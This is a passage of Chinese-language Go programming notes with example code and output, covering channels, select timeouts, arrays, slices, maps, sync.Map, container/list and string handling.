\t\u0026#34;time\u0026#34; ) //使用无缓冲 channel 发送数据 func writeRoutine(intChan chan int) { \tfor i := 0; i \u0026lt; 3; i++ { \tintChan \u0026lt;- i \ttime.Sleep(time.Duration(2) * time.Second) \tfmt.Println(\u0026#34;Send\u0026#34;, i) \t} \t//关闭 channel \tclose(intChan) } // 从无缓冲 channel 读取数据 func readRoutine(intChan chan int) { \tfor val := range intChan{ \tfmt.Println(\u0026#34;Receive =\u0026#34;, val) \ttime.Sleep(time.Duration(10) * time.Second) \t} \treturn } func main() { \t// 创建无缓冲 channel \tc := make(chan int) \tgo writeRoutine(c) \treadRoutine(c) }   带缓冲chan 带缓冲的通道是一种在被接收前能存储一个或者多个值的通道。这种类型的通道并不强制要求 goroutine 之间必须同时完成发送和接收\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  package main import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;time\u0026#34; ) //使用带缓冲 channel 发送数据 func writeRoutine(intChan chan int) { \tfor i := 0; i \u0026lt; 3; i++ { \tintChan \u0026lt;- i \ttime.Sleep(time.Duration(2) * time.Second) \tfmt.Println(\u0026#34;Send\u0026#34;, i) \t} \t//关闭 channel \tclose(intChan) } // 从带缓冲 channel 读取数据 func readRoutine(intChan chan int) { \tfor val := range intChan{ \tfmt.Println(\u0026#34;Receive =\u0026#34;, val) \ttime.Sleep(time.Duration(10) * time.Second) \t} \treturn } func main() { \t// 创建带缓冲 channel \tc := make(chan int, 3) \tgo writeRoutine(c) \treadRoutine(c) }   channel超时处理 在并发编程的通信过程中，经常会遇到超时问题，即向 channel 写数据时发现 channel 已满，或者从 channel 试图读取数据时发现 channel 为空。如果不正确处理这些情况，很可能会导致整个 goroutine 锁死。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  package main import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;time\u0026#34; ) func main() { \tch := make(chan int) \tquit := make(chan bool) \t//新开一个协程 \tgo func() { \tfor { \tselect { \tcase num := \u0026lt;-ch: //如果有数据，下面打印。但是有可能ch一直没数据 \tfmt.Println(\u0026#34;received num = \u0026#34;, num) \tcase \u0026lt;-time.After(3 * time.Second): //上面的ch如果一直没数据会阻塞，那么select也会检测其他case条件，检测到后3秒超时 \tfmt.Println(\u0026#34;TimeOut\u0026#34;) \tquit \u0026lt;- true //写入 \t} \t} \t}() //别忘了() \tfor i := 0; i \u0026lt; 3; i++ { \tch \u0026lt;- i \ttime.Sleep(time.Second) \t} \t\u0026lt;-quit //这里暂时阻塞，直到可读 \tfmt.Println(\u0026#34;Over\u0026#34;) }   1 2 3 4 5  received num = 0 received num = 1 received num = 2 TimeOut Over   select Go 语言中提供了 select 关键字，可以同时响应多个通道的操作。select 里的每个 case 语句必须是一个 IO 操作。\n并且，select 后面并不带判断条件，而是直接去查看 case 语句。每个 case 语句都必须是一个面向 channel 的操作。当 select 里面有多个 case 都满足条件出发时，则 select 会随机选取一个 case 执行。只要有一个case执行，select就会退出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  package main import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;time\u0026#34; ) func pythonSender(ch chan string){ \ttime.Sleep(10 * time.Second) \tch \u0026lt;- \u0026#34;Python Sender\u0026#34; } func golangSender(ch chan string){ \ttime.Sleep(5 * time.Second) \tch \u0026lt;- \u0026#34;Golang Sender\u0026#34; } func main() { \tchStr1 := make(chan string) \tchStr2 := make(chan string) \tgo pythonSender(chStr1) \tgo golangSender(chStr2)  // 使用 select 监听多个 channel \tselect{ \tcase str1 := \u0026lt;-chStr1: \tfmt.Println(str1) \tcase str2 := \u0026lt;- chStr2: \tfmt.Println(str2) \tdefault: \tfmt.Println(\u0026#34;Run default case\u0026#34;) \t} }   select超时 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  package main import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;time\u0026#34; ) func pythonSender(ch chan string){ \ttime.Sleep(100 * time.Second) \tch \u0026lt;- \u0026#34;Python Sender\u0026#34; } func golangSender(ch chan string){ \ttime.Sleep(500 * time.Second) \tch \u0026lt;- \u0026#34;Golang Sender\u0026#34; } func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \tchStr1 := make(chan string) \tchStr2 := make(chan string) \tgo pythonSender(chStr1) \tgo golangSender(chStr2) \t// 使用 time.After 处理 select 超时 \tselect{ \tcase str1 := \u0026lt;-chStr1: \tfmt.Println(str1) \tcase str2 := \u0026lt;- chStr2: \tfmt.Println(str2) \tcase \u0026lt;-time.After(10 * time.Second): \tfmt.Println(\u0026#34;Timed out\u0026#34;) \t} }   集合类 数组 Go 语言的数组是一个由固定长度的特定类型元素组成的序列，一个数组可以由零个或多个元素组成。Go 语言数组定义：\n1  var varName [count]Type   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//使用下标索引的形式，可以访问数组元素 \tvar arrHaiCoder [3]string \tarrHaiCoder[0] = \u0026#34;Hello\u0026#34; \tarrHaiCoder[1] = \u0026#34;嗨客网\u0026#34; \tarrHaiCoder[2] = \u0026#34;HaiCoder\u0026#34; \tfmt.Println(\u0026#34;arrHaiCoder0 =\u0026#34;, arrHaiCoder[0]) \tfmt.Println(\u0026#34;arrHaiCoder1 =\u0026#34;, arrHaiCoder[1]) \tfmt.Println(\u0026#34;arrHaiCoder2 =\u0026#34;, arrHaiCoder[2]) }   数组初始化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//创建数组时，即给数组设置初值 \tvar arrHaiCoder [3]string = [3]string{\u0026#34;Hello\u0026#34;, \u0026#34;嗨客网\u0026#34;, \u0026#34;HaiCoder\u0026#34;}  var arrHaiCoder = [3]string{\u0026#34;Hello\u0026#34;, \u0026#34;嗨客网\u0026#34;, \u0026#34;HaiCoder\u0026#34;}  var arrHaiCoder = [...]string{\u0026#34;Hello\u0026#34;, \u0026#34;嗨客网\u0026#34;, \u0026#34;HaiCoder\u0026#34;}  var arrHaiCoder = [...]string{1:\u0026#34;Hello\u0026#34;, 0:\u0026#34;嗨客网\u0026#34;, 2:\u0026#34;HaiCoder\u0026#34;} \tfmt.Println(\u0026#34;arrHaiCoder0 =\u0026#34;, arrHaiCoder[0]) \tfmt.Println(\u0026#34;arrHaiCoder1 =\u0026#34;, arrHaiCoder[1]) \tfmt.Println(\u0026#34;arrHaiCoder2 =\u0026#34;, arrHaiCoder[2]) }   数组遍历 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//我们可以通过 for循环加索引的形式遍历数组 \tvar arrHaiCoder = [3]string{\u0026#34;Hello\u0026#34;, \u0026#34;嗨客网\u0026#34;, \u0026#34;HaiCoder\u0026#34;} \tfor i := 0; i \u0026lt; len(arrHaiCoder); i++ { \tfmt.Println(arrHaiCoder[i]) \t}  for index, value := range arrHaiCoder{ \tfmt.Println(\u0026#34;Index =\u0026#34;, index, \u0026#34;Value =\u0026#34;, value) \t} }   数组比较 Go 语言的数组的比较，是使用 == 的方式，如果数组的元素个数不相同，那么不能比较数组。长度与数组元素完全相同的两个数组\n多维数组 1 2 3 4 5 6 7 8 9 10  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//创建一个三行两列的二维数组 \tvar arrHaiCoder = [3][2]string{{\u0026#34;Server\u0026#34;, \u0026#34;Python\u0026#34;}, {\u0026#34;Server\u0026#34;, \u0026#34;Golang\u0026#34;}, {\u0026#34;JavaScript\u0026#34;, \u0026#34;Vue\u0026#34;}} \tfmt.Println(\u0026#34;arrHaiCoder =\u0026#34;, arrHaiCoder) }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//给定义好的三维数组赋值 \tvar arrHaiCoder [2][2][2]int \tfor i := 0; i \u0026lt; 2; i++ { \tfor j := 0; j \u0026lt; 2; j++ { \tfor k := 0; k \u0026lt; 2; k++{ \tarrHaiCoder[i][j][k] = i * 100 + j * 10 + k \t} \t} \t} \tfmt.Println(\u0026#34;arrHaiCoder =\u0026#34;, arrHaiCoder) }   切片 切片的英文是 slice，Golang 中的切片是 数组 的一个引用，因此切片是引用类型，在进行传递时，遵守引用的传递机制。\n切片的使用和数组类似，遍历切片、访问切片的元素和求切片的长度 len 与数组都一样。但切片的长度是可以变化的，不像数组是固定的，因此也可以说切片是一个可以动态变化的数组。\n1  var sliceName []Type   1 2 3 4 5 6 7 8 9 10 11 12  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//使用下标索引的形式，可以访问切片元素 \tvar sliceHaiCoder = []string{\u0026#34;Hello\u0026#34;, \u0026#34;嗨客网\u0026#34;, \u0026#34;HaiCoder\u0026#34;} \tfmt.Println(\u0026#34;sliceHaiCoder0 =\u0026#34;, sliceHaiCoder[0]) \tfmt.Println(\u0026#34;sliceHaiCoder1 =\u0026#34;, sliceHaiCoder[1]) \tfmt.Println(\u0026#34;sliceHaiCoder2 =\u0026#34;, sliceHaiCoder[2]) }   Go语言切片遍历总结 Go 语言的切片的遍历，有两种方式，分别为：通过 for 循环与通过 for range 循环的方式。Go 语言 for 循环遍历切片：\n1 2 3  for i := 0; i \u0026lt; len(slice); i++ {  //slice[i] }   Go 语言 for range 循环遍历切片：\n1 2  for index, value := range sliceHaiCoder{ }   append 1 2 3 4 5 6 7 8 9 10 11 12  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//使用append函数，给切片添加一个切片 \tvar sliceHaiCoder = []string{\u0026#34;Hello\u0026#34;, \u0026#34;HaiCoder\u0026#34;} \tvar appendSlice = []string{\u0026#34;haicoder\u0026#34;, \u0026#34;嗨客网\u0026#34;} \tsliceHaiCoder = append(sliceHaiCoder, appendSlice...) \tfmt.Println(\u0026#34;sliceHaiCoder =\u0026#34;, sliceHaiCoder) }   Go语言切片添加元素 1 2 3 4 5 6 7 8 9 10  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \t//使用append函数，配合切片索引实现在切片的index处添加元素 \tvar sliceHaiCoder = []string{\u0026#34;Hello\u0026#34;, \u0026#34;HaiCoder\u0026#34;} \tsliceHaiCoder = append(sliceHaiCoder[:1], \u0026#34;嗨客网\u0026#34;) \tfmt.Println(\u0026#34;sliceHaiCoder =\u0026#34;, sliceHaiCoder) }   1  sliceHaiCoder = [Hello 嗨客网]   1 2 3 4 5 6 7 8 9 10 11  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \t//使用append函数，在切片的index处插入切片 \tvar sliceHaiCoder = []string{\u0026#34;Hello\u0026#34;, \u0026#34;HaiCoder\u0026#34;} \tvar sliceCategory = []string{\u0026#34;Golang\u0026#34;,\u0026#34;Python\u0026#34;,\u0026#34;JavaScript\u0026#34;} \tsliceHaiCoder = append(sliceHaiCoder[:1], append(sliceCategory, sliceHaiCoder[1:]...)...) \tfmt.Println(\u0026#34;sliceHaiCoder =\u0026#34;,sliceHaiCoder) }   1  sliceHaiCoder = [Hello Golang Python JavaScript HaiCoder]   Go语言切片删除元素总结 删除索引 index 处的元素：\n1  sliceHaiCoder = append(sliceHaiCoder[:index], sliceHaiCoder[index+1:]...)   删除索引 index 到 index2 处的元素：\n1  sliceHaiCoder = append(sliceHaiCoder[:index], sliceHaiCoder[index2:]...)   删除切片的第一个元素语法：\n1  sliceHaiCoder = sliceHaiCoder[1:]   删除切片的最后一个元素语法：\n1  sliceHaiCoder = sliceHaiCoder[:len(sliceHaiCoder)-1]   删除切片前 N 个元素语法：\n1  sliceHaiCoder = sliceHaiCoder[N:]   删除切片后 N 个元素语法：\n1  sliceHaiCoder = sliceHaiCoder[:len(sliceHaiCoder)-N]   Go语言切片复制总结 Go 语言的切片的复制使用内置的 copy 函数。Go 语言 copy 函数语法：\n1  func copy(dst, src []Type) int   将切片 src 拷贝到切片 dst，返回拷贝成功的元素的个数。如果切片 src 的长度大于 dst 切片的长度，那么只会复制 dst 切片长度个元素。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  package main  import ( \t\u0026#34;fmt\u0026#34; )  func main() { \t//使用内置的 copy 函数，复制切片 \tvar sliceSrc = []string{\u0026#34;Hello\u0026#34;, \u0026#34;HaiCoder\u0026#34;} \tvar sliceDst = []string{\u0026#34;嗨客网\u0026#34;, \u0026#34;Python\u0026#34;, \u0026#34;Golang\u0026#34;} \tcopy(sliceDst, sliceSrc) \tfmt.Println(\u0026#34;sliceDst =\u0026#34;, sliceDst) \tvar sliceSrc1 = []string{\u0026#34;嗨客网\u0026#34;, \u0026#34;Python\u0026#34;, \u0026#34;Golang\u0026#34;} \tvar sliceDst1 = []string{\u0026#34;Hello\u0026#34;, \u0026#34;HaiCoder\u0026#34;} \tcopy(sliceDst1, sliceSrc1) \tfmt.Println(\u0026#34;sliceDst1 =\u0026#34;, sliceDst1) }   1 2  sliceDst = [Hello HaiCoder Golang] sliceDst1 = [嗨客网 Python]   Go语言多维切片遍历总结 Go 语言的多维切片的遍历，有两种方式，分别为：通过 for 循环与通过 for range 循环的方式。Go 语言 for 循环遍历切片：\n1 2 3 4 5 6  for i := 0; i \u0026lt; len(slice); i++ {  //slice[i]  for j := 0; j \u0026lt; len(slice[i]); j++{  //slice[i][j]  } }   Go 语言 for range 循环遍历切片：\n1 2 3 4  for index, value := range sliceHaiCoder{  for index2, value2 := range sliceHaiCoder[index]{ \t} }   Go语言数组与切片区别教程 Golang 中 数组 与 切片 的区别主要体现在以下几点：\n 切片是指针类型，数组是值类型 数组的长度是固定的，而切片长度可以任意调整（切片是动态的数组） 数组只有长度一个属性，而切片比数组多了一个容量（cap)属性 切片的底层也是数组实现的  字典 Go 语言 中 map 是一个 key（索引）和 value（值）形式的无序的集合，也可以称为关联数组或字典，Golang 中的 map 能够快速根据给定 key，找到对应的 value 的数据结构。\nGolang 的 map 的 key 可以是任何可以使用 == 进行比较的 数据类型，比如 int、string、bool 等，value 可以是任意的类型。\nmap 是一个无序的数据结构，因此同一个 map，每次遍历获取的顺序很可能是不一致的。\nGo语言map的创建总结 Go 语言中 map 的创建有三种形式，分别为：先定义后使用 make 创建、直接使用 make 创建和初始化创建。先定义后使用 make 创建：\n1 2  var mapName map[keyType]valueType mapName = make(map[keyType]valueType, len)   直接使用 make 创建：\n1  mapName := make(map[keyType]valueType, len)   初始化创建：\n1 2 3 4 5  mapName := map[keyType]valueType{  \u0026#34;KEY1\u0026#34;:\u0026#34;Value1\u0026#34;,  \u0026#34;KEY2\u0026#34;:\u0026#34;Value2\u0026#34;,  \u0026#34;KEY3\u0026#34;:\u0026#34;Value3\u0026#34; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() {  var mapHaiCoder map[string]string \tmapHaiCoder = make(map[string]string, 3) \tmapHaiCoder[\u0026#34;Server\u0026#34;] = \u0026#34;Golang\u0026#34; \tmapHaiCoder[\u0026#34;JavaScript\u0026#34;] = \u0026#34;Vue\u0026#34; \tmapHaiCoder[\u0026#34;Db\u0026#34;] = \u0026#34;Redis\u0026#34;  fmt.Println(\u0026#34;mapHaiCoder =\u0026#34;, mapHaiCoder)  mapHaiCoder := make(map[string]string, 3) \tmapHaiCoder[\u0026#34;Server\u0026#34;] = \u0026#34;Golang\u0026#34; \tmapHaiCoder[\u0026#34;JavaScript\u0026#34;] = \u0026#34;Vue\u0026#34; \tmapHaiCoder[\u0026#34;Db\u0026#34;] = \u0026#34;Redis\u0026#34; \tfmt.Println(\u0026#34;mapHaiCoder =\u0026#34;, mapHaiCoder) \t//创建map时，需指定map的key的类型和value的类型 \therosMap := map[string]string{ \t\u0026#34;hero1\u0026#34;:\u0026#34;宋江\u0026#34;, \t\u0026#34;hero2\u0026#34;:\u0026#34;卢俊义\u0026#34;, \t\u0026#34;hero3\u0026#34;:\u0026#34;吴用\u0026#34;, \t} \tfmt.Println(herosMap) }   Go语言map的赋值总结 Go 语言中 map 的赋值有两种形式，分别为：先 make 后赋值和直接初始化赋值。先 make 后赋值语法：\n1 2 3 4  var mapName = make(map[keyType]valueType, len) mapName[Key1] = Vlaue1 mapName[Key2] = Vlaue2 mapName[Key3] = Vlaue3   初始化赋值语法：\n1 2 3 4 5  mapName := map[keyType]valueType{  \u0026#34;KEY1\u0026#34;:\u0026#34;Value1\u0026#34;,  \u0026#34;KEY2\u0026#34;:\u0026#34;Value2\u0026#34;,  \u0026#34;KEY3\u0026#34;:\u0026#34;Value3\u0026#34; }   Go语言map遍历总结 Go 语言中 map 的遍历只能使用 for range 的形式，for range 循环返回的第一个是 map 的 key，返回的第二个是 map 的 value。\n使用 for range 遍历 map，如果我们只使用一个返回参数接受，那么返回的是 map 的 key。因此 map 是无序的，因此同一个 map，每次遍历获取的结果的顺序很可能是不一致的。for range 循环遍历 map 语法：\n1 2  for key, value := range mapName{ }   for range 循环遍历 map key 语法：\n1 2  for key := range mapName{ }   Go语言获取map元素教程 Go 语言 中要获取 map 中的元素，除了使用 遍历 的方式，我们还可以使用 key 做为索引的形式来获取 map 指定 key 的元素。\n根据 map 的 key 获取 map 的元素，返回两个返回值，第一个返回值是获取的值，如果 key 不存在，返回空值，第二个参数是一个 bool 值，表示获取值是否获取成功。\n如果我们只使用一个值，接受 map 的返回值，那么返回的 map 的 key 对应的 value，如果我们需要判断一个 map 中的 key 是否存在，那么我们可以使用 _ 忽略返回的第一个值，然后判断返回的第二个 bool 值为 true 还是 false。\nGo语言删除map元素总结 Go 语言中要删除 map 中的元素，使用内置的 delete 函数。Go 语言 delete 语法：\n1  delete(mapName, KEY)   如果 key 在 mapName 的 map 中，不存在，不会报错。\nGo语言sync.Map教程 Go 语言 中 map 如果在并发读的情况下是线程安全的，如果是在并发写的情况下，则是线程不安全的。Golang 为我们提供了一个 sync.Map 是并发写安全的。\nGolang 中的 map 的 key 和 value 的 类型 必须是一致的，但 sync.Map 的 key 和 value 不一定是要相同的类型，不同的类型也是支持的。\nGo 语言 sync.Map 无须初始化，直接声明即可使用。sync.Map 不能使用 map 的方式进行取值和设置等操作，而是使用 sync.Map 的方法进行调用，Store 表示存储，Load 表示获取，Delete 表示删除。\n使用 Range 配合一个回调函数进行遍历操作，通过回调函数返回内部遍历出来的值，Range 参数中回调函数的返回值在需要继续迭代遍历时，返回 true，终止迭代遍历时，返回 false。\nGo语言sync.Map添加元素总结 Go 语言中 sync.Map 的添加元素不是跟原生的 map 一样，使用 [] 的形式，而是使用内置的 Store 函数。Go 语言sync.Map Store 语法：\n1  func (m *Map) Store(key, value interface{})   Go语言sync.Map获取元素总结 Go 语言中 sync.Map 的获取元素不是跟原生的 map 一样，使用 [] 的形式，而是使用内置的 Load 函数。Go 语言 sync.Map Load 语法：\n1  func (m *Map) Load(key interface{}) (value interface{}, ok bool)   Go语言sync.Map删除元素总结 Go 语言中 sync.Map 的删除元素是使用内置的 Delete 函数。Go 语言 sync.Map Delete 语法：\n1  func (m *Map) Delete(key interface{})   Go语言sync.Map遍历元素总结 Go 语言 中 sync.Map 的元素遍历，不可以使用 for 循环 或者 for range 循环，而是使用 Range 配合一个回调 函数 进行遍历操作。\n通过回调函数返回内部遍历出来的值，Range 参数中回调函数的返回值在需要继续迭代遍历时，返回 true，终止迭代遍历时，返回 false。\nGo 语言中 sync.Map 的元素遍历，不可以使用 for 循环或者 for range 循环，而是使用 Range 配合一个回调函数进行遍历操作。Go 语言 sync.Map Range 语法：\n1  func (m *Map) Range(f func(key, value interface{}) bool)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;sync\u0026#34; )  func walk1(key, value interface{}) bool { \tfmt.Println(\u0026#34;Key =\u0026#34;, key, \u0026#34;Value =\u0026#34;, value) \treturn true } func walk2(key, value interface{}) bool { \tfmt.Println(\u0026#34;Key =\u0026#34;, key, \u0026#34;Value =\u0026#34;, value) \treturn false } func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//使用 sync.Map Range 遍历元素 \tvar mapHaiCoder sync.Map \tmapHaiCoder.Store(\u0026#34;Server\u0026#34;, \u0026#34;Golang\u0026#34;) \tmapHaiCoder.Store(\u0026#34;JavaScript\u0026#34;, \u0026#34;Vue\u0026#34;) \tmapHaiCoder.Store(\u0026#34;Db\u0026#34;, \u0026#34;Redis\u0026#34;) \tmapHaiCoder.Range(walk1) \tmapHaiCoder.Range(walk2) }   1 2 3 4  Key = Server Value = Golang Key = JavaScript Value = Vue Key = Db Value = Redis Key = JavaScript Value = Vue   Go语言sync.Map LoadOrStore教程 Go 语言 中 sync.Map 的 LoadOrStore 函数 表示，如果我们获取的 key 存在，那么就返回 key 对应的元素，如果获取的 key 不存在，那么就返回我们设置的值，并且将我们设置的值，存入 map。\n列表 列表是一种非连续的存储容器，由多个节点组成，节点通过一些 变量 记录彼此之间的关系，列表有多种实现方法，如单链表、双链表等。\n在 Go 语言 中，列表使用 container/list 包来实现，内部的实现原理是双链表，列表能够高效地进行任意位置的元素插入和删除操作。\nGolang 中的列表可以存储任意 数据类型 的值，列表的初始化有两种方式，\n使用 list.New 初始化列表语法：\n1  listName := list.New()   使用 var 初始化列表：\n1  var listName = list.List   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  package main  import ( \t\u0026#34;container/list\u0026#34; \t\u0026#34;fmt\u0026#34; )  func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//通过 list.New 创建列表 \tlistHaiCoder := list.New() \tlistHaiCoder.PushBack(\u0026#34;Hello\u0026#34;) \tlistHaiCoder.PushBack(\u0026#34;HaiCoder\u0026#34;) \tfmt.Println(listHaiCoder) \tvar listHaiCoder2 list.List \tlistHaiCoder2.PushBack(\u0026#34;Hello\u0026#34;) \tlistHaiCoder2.PushBack(\u0026#34;HaiCoder\u0026#34;) \tfmt.Println(listHaiCoder2) }  \u0026amp;{{0xc0000744b0 0xc0000744e0 \u0026lt;nil\u0026gt; \u0026lt;nil\u0026gt;} 2} {{0xc000074570 0xc0000745a0 \u0026lt;nil\u0026gt; \u0026lt;nil\u0026gt;} 2}   Go语言列表list插入元素总结 Golang 的列表元素的插入有四种情景，分别为：在指定元素前插入、在指定元素后插入、在列表头部插入和在列表尾部插入。在列表指定元素前插入语法：\n1  InsertBefore(v interface {}, mark * Element) *Element   在列表指定元素后插入语法：\n1  InsertAfter(v interface {}, mark * Element) *Element   在列表头部插入语法：\n1  PushFront(v interface{}) *Element   在列表尾部插入语法：\n1  PushBack(v interface{}) *Element   Go语言列表list插入列表总结 在一个列表中插入另一个列表，只支持两种情况，分别为：在头部插入列表和在尾部插入列表。在头部插入列表语法：\n1  PushFrontList(other *List)   在尾部插入列表语法：\n1  PushBackList(other *List)   Go语言列表list删除元素总结 Golang 的列表的删除元素使用 remove 函数，删除的元素不能为空，如果为空，会报异常。列表删除元素Remove 语法：\n1  Remove(e *Element) interface{}   Go语言列表list遍历总结 Golang 的列表的遍历分为正序遍历和倒叙遍历，正序遍历就是从链表的头元素遍历到尾元素，倒叙遍历就是从链表的尾元素遍历到链表的头元素。Go 语言列表正序遍历语法：\n1 2 3  for i := lis.Front(); i != nil; i = lis.Next() {  fmt.Println(i.Value) }   Go 语言列表倒叙遍历语法：\n1 2 3  for i := listHaiCoder.Back(); i != nil; i = i.Prev() { \tfmt.Println(i.Value) }   Go语言列表list元素移动教程 Golang 的 列表 元素的移动有两种情景，分别为：将指定元素移动到另一元素的前面和将 指定元素移动到另一元素的后面 。\n如果将指定元素移动到另一元素的前面中的指定元素本来就在另一元素的前面，那么列表不会做任何的改动，或者如果指定元素不是列表中的元素，列表也不会做任何改动。\n1 2  MoveBefore(e, mark *Element) MoveAfter(e, mark *Element)   参数\n   参数 描述     e 要移动的元素。   mark 移动元素的基准元素。    Go语言列表list元素移动总结 如果要移到最前面的元素本来就在列表的最前面，那么列表不会做任何的改动，或者如果指定元素不是列表中的元素，列表也不会做任何改动。移到列表最前语法：\n1  MoveToFront(e *Element)   如果要移到最后面的元素本来就在列表的最后面，那么列表不会做任何的改动，或者如果指定元素不是列表中的元素，列表也不会做任何改动。移到列表最后语法：\n1  MoveToBack(e *Element)   Go语言列表list获取元素总结 Golang 的列表元素的获取可以使用内置的 Front 函数获取头结点，使用 Back 函数获取尾结点，使用 Prev 获取前一个结点，使用 Next 获取下一个结点。获取列表头结点语法：\n1  Front() *Element   获取列表尾结点语法：\n1  Back () *Element   获取上一个结点语法：\n1  Prev() *Element   获取下一个结点语法：\n1  Next() *Element   Go语言列表list长度总结 Golang 的列表长度的获取使用列表内置的 Len 函数。获取列表长度语法：\n1  Len() int   Go语言nil特性  nil 标识符是不能比较的 nil 不是关键字或保留字 不同类型 nil 的指针是一样的 不同类型的 nil 是不能比较的 两个相同类型的 nil 值也可能无法比较 nil 是常见引用类型的零值  Go语言new与make区别教程 Go 语言 中 new 和 make 是两个内置 函数，主要用来创建并分配内存。Golang 中的 new 与 make 的区别是 new 只分配内存，而 make 只能用于 slice、map 和 channel 的初始化。\nnew和make主要区别  make 只能用来分配及初始化类型为 slice、map、chan 的数据，而 new 可以分配任意类型的数据。 new 分配返回的是指针，即类型 *Type。make 返回引用，即 Type。 new 分配的空间被清零。make 分配空间后，会进行初始化。  字符串 截取字符串 如果我们要截取的字符串中包含中文字符串，首先需要将字符串转换成 rune 数组。Go 语言获取字符语法为：\n1  string[index]   Go 语言截取字符串，也叫 Go 语言字符串切片，其语法格式为：\n1  string[start : end]   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  package main  import ( \t\u0026#34;fmt\u0026#34; )  func main() { \t//截取中文字符串时，首先需要将字符串转换成 rune 数组 \tstr := \u0026#34;林志玲\u0026#34; \tstr1 := str[0:2] \tstrC := []rune(str) \tstr2 := strC[0:2] \tfmt.Println(\u0026#34;str1 =\u0026#34;, string(str1), \u0026#34;str2 =\u0026#34;, string(str2)) }  /str1 = �� str2 = 林志   拼接字符串总结 Go 语言拼接字符串有五种方法，分别是：使用+号拼接、使用 sprintf 拼接、使用 join 函数拼接、使用 buffer.WriteString 函数拼接、使用 buffer.Builder 拼接。使用 + 号拼接语法：\n1  str = str1+str2   使用 sprintf 拼接语法：\n1  str = fmt.Sprintf(\u0026#34;%s%d%s\u0026#34;, s1, i, s2)   使用 join 函数拼接：\n1 2  var str []string = []string{s1, s2} s := strings.Join(str, \u0026#34;\u0026#34;)   使用 buffer.WriteString 函数拼接：\n1 2 3 4 5  var bt bytes.Buffer bt.WriteString(s1) bt.WriteString(s2) //获得拼接后的字符串 s3 := bt.String()   使用 buffer.Builder 拼接：\n1 2 3 4  var build strings.Builder build.WriteString(s1) build.WriteString(s2) s3 := build.String()   常见的字符串拼接方式\n      strings.Builder bytes.Buffer  strings.Builder 最快，bytes.Buffer 较快，+ 最慢\n原理\n 字符串在 Go 语言中是不可变类型，占用内存大小是固定的，当使用 + 拼接 2 个字符串时，生成一个新的字符串，那么就需要开辟一段新的空间，新空间的大小是原来两个字符串的大小之和 strings.Builder，bytes.Buffer 的内存是以倍数申请的 strings.Builder 和 bytes.Buffer 底层都是 []byte 数组，bytes.Buffer 转化为字符串时重新申请了一块空间，存放生成的字符串变量，而 strings.Builder 直接将底层的 []byte 转换成了字符串类型返回  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  package main  import ( \t\u0026#34;bytes\u0026#34; \t\u0026#34;fmt\u0026#34; \t\u0026#34;strings\u0026#34; )  func main() {  \t//使用 join 函数，实现拼接字符串 \tstr1 := \u0026#34;Hello,\u0026#34; \tstr2 := \u0026#34;HaiCoder\u0026#34; \tvar str = []string{str1, str2} \tstrHaiCoder := strings.Join(str, \u0026#34;\u0026#34;) \tfmt.Println(\u0026#34;strHaiCoder =\u0026#34;, strHaiCoder)  \t//使用 buffer.WriteString 函数拼接字符串 \tvar bt bytes.Buffer \tbt.WriteString(str1) \tbt.WriteString(str2) \tstrHaiCoder2 := bt.String() \tfmt.Println(\u0026#34;strHaiCoder2 =\u0026#34;, strHaiCoder2)  \t//使用 buffer.Builder 函数拼接字符串 \tvar build strings.Builder \tbuild.WriteString(str1) \tbuild.WriteString(str2) \tstrHaiCoder3 := build.String() \tfmt.Println(\u0026#34;strHaiCoder3 =\u0026#34;, strHaiCoder3)  \tstrHaiCoder4 := str1 + str2 \tfmt.Println(\u0026#34;strHaiCoder4 =\u0026#34;, strHaiCoder4)  \tstrHaiCoder5 := fmt.Sprintf(\u0026#34;%s %d %s\u0026#34;, str1, 1024, str2) \tfmt.Println(\u0026#34;strHaiCoder5 =\u0026#34;, strHaiCoder5) }   